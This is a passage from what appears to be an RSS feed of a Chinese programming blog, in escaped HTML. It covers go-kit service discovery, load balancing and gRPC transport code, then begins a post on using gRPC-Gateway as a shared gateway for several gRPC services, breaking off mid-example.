&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// Each individual endpoint is an http/transport.Client (which implements
&lt;/span>&lt;span class="c1">// endpoint.Endpoint) that gets wrapped with various middlewares. If you
&lt;/span>&lt;span class="c1">// made your own client library, you&amp;#39;d do this work there, so your server
&lt;/span>&lt;span class="c1">// could rely on a consistent set of client behavior.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">sumEndpoint&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">httptransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewClient&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nf">copyURL&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;/sum&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">encodeHTTPGenericRequest&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">decodeHTTPSumResponse&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">).&lt;/span>&lt;span class="nf">Endpoint&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>github.com/go-kit/kit/transport&lt;/code> 这个包提供了很多有用的助手函数来帮助构造 &lt;code>Endpoint&lt;/code> ，以及黏合服务端的 &lt;code>Endpoint&lt;/code> 到传输层代码。（PS：请回顾前文中使用的 &lt;code>httptransport.NewServer&lt;/code>）&lt;/p>
&lt;h3 id="服务发现">服务发现&lt;/h3>
&lt;p>参考 &lt;a class="link" href="https://github.com/go-kit/examples/blob/master/apigateway/main.go" target="_blank" rel="noopener"
>apigateway&lt;/a> 的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// Each method gets constructed with a factory. Factories take an
&lt;/span>&lt;span class="c1">// instance string, and return a specific endpoint. In the factory we
&lt;/span>&lt;span class="c1">// dial the instance string we get from Consul, and then leverage an
&lt;/span>&lt;span class="c1">// addsvc client package to construct a complete service. We can then
&lt;/span>&lt;span class="c1">// leverage the addsvc.Make{Sum,Concat}Endpoint constructors to convert
&lt;/span>&lt;span class="c1">// the complete service to specific endpoint.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="nx">tags&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">passingOnly&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">true&lt;/span>
&lt;span class="nx">endpoints&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">addendpoint&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Set&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">instancer&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">consulsd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewInstancer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">client&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">logger&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;addsvc&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tags&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">passingOnly&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="nx">factory&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nf">addsvcFactory&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">addendpoint&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">MakeSumEndpoint&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tracer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">zipkinTracer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">logger&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">endpointer&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">sd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewEndpointer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">instancer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">factory&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">logger&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">balancer&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">lb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewRoundRobin&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">endpointer&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">retry&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">lb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Retry&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">retryMax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">retryTimeout&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">balancer&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">endpoints&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SumEndpoint&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">retry&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220228171821569.png"
width="925"
height="573"
srcset="https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220228171821569_hude2acf9d66679c44454b1c6e5dc1473c_66465_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220228171821569_hude2acf9d66679c44454b1c6e5dc1473c_66465_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="示意图"
class="gallery-image"
data-flex-grow="161"
data-flex-basis="387px"
>&lt;/p>
&lt;p>总得来说，go kit 的服务发现机制靠客户端以特定的方式构造 &lt;code>Endpoint&lt;/code> ，这和反向代理或者 side-car 代理实现的服务发现不一样。&lt;/p>
&lt;p>比如说 kubernetes 的 ClusterIP 基于 kube-proxy，后端有多个 POD 的时候 kube-proxy 会自动进行负载均衡，但算法是 kube-proxy 实现决定的，不可依赖。&lt;/p>
&lt;p>再比如 nginx 也能一定程度实现服务发现和负载均衡。&lt;/p>
&lt;p>再比如，linkerd 这样的 service mesh，非侵入，提供负载均衡、服务发现、重试这些功能。&lt;/p>
&lt;p>go kit 的工具箱里提供的是客户端的负载均衡机制。上图里的代码可以用下图表示。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220228172730622.png"
width="574"
height="626"
srcset="https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220228172730622_hu7c2f12e783b3c572c3387446a921feeb_14775_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220228172730622_hu7c2f12e783b3c572c3387446a921feeb_14775_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="负载均衡"
class="gallery-image"
data-flex-grow="91"
data-flex-basis="220px"
>&lt;/p>
&lt;h3 id="多传输层实现">多传输层实现&lt;/h3>
&lt;p>这里尝试实现 &lt;code>http&lt;/code> 和 &lt;code>grpc&lt;/code> 两种 rpc 传输层协议。首先为了保证最大化复用代码，在 &lt;code>http&lt;/code> 实现中定义的结构和 endpoint 肯定是要复用起来的，不然每个传输层都来一次的话没codegen非得手指敲断不可。&lt;/p>
&lt;p>先提取 &lt;code>makeXXXEndpoint&lt;/code> 代码和 &lt;code>XXXRequest&lt;/code> 这样的结构到单独的文件里。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220301115635464.png"
width="1920"
height="1040"
srcset="https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220301115635464_hu2db5290091178b734e80b60459e1fef9_216608_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220301115635464_hu2db5290091178b734e80b60459e1fef9_216608_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="提取定义"
class="gallery-image"
data-flex-grow="184"
data-flex-basis="443px"
>&lt;/p>
&lt;p>思路上部分参考的 gokit 案例中 &lt;code>addsvc&lt;/code>，&lt;a class="link" href="https://github.com/go-kit/examples/blob/master/addsvc/README.md" target="_blank" rel="noopener"
>链接&lt;/a>。&lt;/p>
&lt;p>proto 文件如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-protobuf" data-lang="protobuf">&lt;span class="c1">// play/stringsvc/transport/pb/stringsvc.proto
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">syntax&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;proto3&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="k">option&lt;/span> &lt;span class="n">go_package&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;play/stringsvc/transport/pb&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="kd">message&lt;/span> &lt;span class="nc">UppercaseRequest&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="p">}&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="kd">message&lt;/span> &lt;span class="nc">UppercaseResponse&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="n">v&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="p">}&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="kd">message&lt;/span> &lt;span class="nc">CountRequest&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="p">}&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="kd">message&lt;/span> &lt;span class="nc">CountResponse&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="kt">int32&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="p">}&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="kd">service&lt;/span> &lt;span class="n">StringService&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="k">rpc&lt;/span> &lt;span class="n">Uppercase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">UppercaseRequest&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">UppercaseResponse&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="k">rpc&lt;/span> &lt;span class="n">Count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">CountRequest&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">CountResponse&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后使用 protoc 生成 go 源码，具体参考 &lt;a class="link" href="https://www.grpc.io/docs/languages/go/quickstart/" target="_blank" rel="noopener"
>gRPC 的官方文档&lt;/a>。继续下一步之前要先了解 go 语言的 gRPC 服务框架在一般情况下怎么实现。同样建议直接看文档。简单说就是写一个结构，实现 protoc 根据你的 proto 文件生成的接口，最后调用注册方法把你的实现注册到 gRPC 服务器上就可以了。&lt;/p>
&lt;p>再考虑请求进入我们的服务代码要经过的流程，gRPC 接口的实现要做事情其实就是把 proto 定义的结构转换成我们之前定义的结构，再调用之前定义的 &lt;code>Endpoint&lt;/code> 。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220301134821969.png"
width="437"
height="488"
srcset="https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220301134821969_huf9fd1139fbbfdafdb0f01166b9d50a9e_18354_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220301134821969_huf9fd1139fbbfdafdb0f01166b9d50a9e_18354_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="gRPC作为传输层协议的交互流程"
class="gallery-image"
data-flex-grow="89"
data-flex-basis="214px"
>&lt;/p>
&lt;p>其中对请求编解码是个很无聊的过程，字段一一赋值即可。endpoint 继续复用先前 http 的版本。gRPC 实现比较取巧，我们把所有 &lt;code>Endpoint&lt;/code> 放到一个结构里保存，然后实现 gRPC 的接口。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;context&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;play/stringsvc&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;play/stringsvc/transport/pb&amp;#34;&lt;/span>
&lt;span class="nx">grpctransport&lt;/span> &lt;span class="s">&amp;#34;github.com/go-kit/kit/transport/grpc&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">set&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">UnimplementedStringServiceServer&lt;/span>
&lt;span class="nx">uppercase&lt;/span> &lt;span class="nx">grpctransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Handler&lt;/span>
&lt;span class="nx">count&lt;/span> &lt;span class="nx">grpctransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Handler&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">NewGRPCServer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span> &lt;span class="nx">stringsvc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StringService&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">set&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">set&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">uppercase&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">grpctransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">MakeUppercaseEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">decodeUppercaseRequestGRPC&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">encodeUppercaseResponseGRPC&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">count&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">grpctransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">MakeCountEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">decodeCountRequestGRPC&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">encodeCountResponseGRPC&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">set&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Uppercase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">UppercaseRequest&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">UppercaseResponse&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">uppercase&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ServeGRPC&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">resp&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">UppercaseResponse&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">set&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CountRequest&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CountResponse&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">count&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ServeGRPC&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">resp&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CountResponse&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里利用了一个 &lt;code>github.com/go-kit/kit/transport/grpc&lt;/code> 的帮助结构，&lt;code>grpctransport.NewServer&lt;/code> 创建的 &lt;code>grpctransport.Server&lt;/code>。这个结构的用途和 &lt;code>httptransport.NewServer&lt;/code>一样，本质上是一个适配器，把 gRPC 的输入适配到我们定义的服务接口。理论上来说不用这玩意儿也没事，但实现代码里就要显式调用 &lt;code>Decode&lt;/code>和&lt;code>Encode&lt;/code>。从解耦的角度来说这种设计会更好。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>之所以说 gokit 大概算是框架，是因为 gokit 提供的这些工具其实有一套自己的最佳实践，但并不强迫遵循。比如 transport 并不是一定要用 gokit 的 transport ，完全可以自己写 &lt;code>http.Handler&lt;/code> ，把 encode/decode 写到一起。也可以把其他方式编写的 RPC 封装成 &lt;code>Endpoint&lt;/code>，获得 gokit 提供的一系列支持。&lt;/p>
&lt;p>gokit 提供了很多有用的工具，解决一些诸如服务发现、熔断器、分布式跟踪和可观测性这样的问题。gokit 的案例代码示范的实践方式也很有启发性。&lt;/p></description></item><item><title>gRPC-Gateway 用作多个 gRPC 服务的网关</title><link>https://nnnewb.github.io/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/</link><pubDate>Wed, 23 Feb 2022 17:30:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>众所周知，API网关是微服务架构的重要组件，起到一个整流过滤的作用。虽然 gRPC-Gateway 要啥没啥，和 API 网关的模式也扯不上太多关系，但总之先起个高调。&lt;/p>
&lt;p>然后就是真正遇到的问题了。在旧的架构里，gRPC-Gateway 的用法，是对每个需要暴露 HTTP 服务的 gRPC 服务都起一个对应的 gRPC-Gateway 。最早的做法是 gRPC-Gateway 服务单独作为一个 POD ，gRPC 服务实现也单独一个 POD 。后来我改成了 Gateway 和 服务在同一个 POD 内，起两个 container 。&lt;/p>
&lt;p>之前的做法都存在一个问题，就是 gRPC-Gateway 要分配少量的 CPU 和内存配额，虽然每个 gRPC-Gateway 服务分到的内存和CPU都很少，但架不住服务多，内存和 CPU 的配额都占用了不少，实际用到的少得可怜，大部分配额都是浪费。&lt;/p>
&lt;p>下面具体分析下怎么把 gateway 单独提取成一个 POD，给所有 gRPC 服务当网关，同时保持负载均衡发挥作用，提供无缝扩容。&lt;/p>
&lt;h2 id="实现网关">实现网关&lt;/h2>
&lt;h3 id="官方demo">官方demo&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// Create a client connection to the gRPC server we just started
&lt;/span>&lt;span class="c1">// This is where the gRPC-Gateway proxies the requests
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">conn&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">grpc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">DialContext&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Background&lt;/span>&lt;span class="p">(),&lt;/span>
&lt;span class="s">&amp;#34;0.0.0.0:8080&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">grpc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">WithBlock&lt;/span>&lt;span class="p">(),&lt;/span>
&lt;span class="nx">grpc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">WithTransportCredentials&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">insecure&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewCredentials&lt;/span>&lt;span class="p">()),&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Fatalln&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Failed to dial server:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">gwmux&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">runtime&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServeMux&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="c1">// Register Greeter
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">helloworldpb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RegisterGreeterHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Background&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">gwmux&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">conn&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Fatalln&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Failed to register gateway:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">gwServer&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Server&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Addr&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;:8090&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Handler&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">gwmux&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Serving gRPC-Gateway on http://0.0.0.0:8090&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Fatalln&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">gwServer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ListenAndServe&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>核心逻辑在这两行：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="nx">gwmux&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">runtime&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServeMux&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="c1">// Register Greeter
